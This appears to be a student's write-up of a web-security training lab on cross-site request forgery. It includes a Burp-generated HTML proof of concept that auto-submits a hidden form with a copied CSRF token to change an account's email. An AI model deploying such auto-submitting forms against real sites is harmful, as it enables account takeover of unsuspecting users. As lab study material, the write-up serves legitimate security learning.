We observe that the csrf token change everytime we submit changing our emails.

I don't know why did they give me 2 differents pair of credentials. I was thinking: "Why don't we get our hidden CSRF token in the form by using DevTool then plug it in our payload?"
I tried that first:

![[Pasted image 20260813162715.png]]

Trial payload:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a0f004d03056387802c0d87008f00fa.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="random3&#64;random&#46;com" />
      <input type="hidden" name="csrf" value="8dgjjWBc1qIXsVTa4UVrSCTOHxT2LLts" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```
And it worked! More successfully than I anticipated! Maybe the second credentials is a clever red herring:)
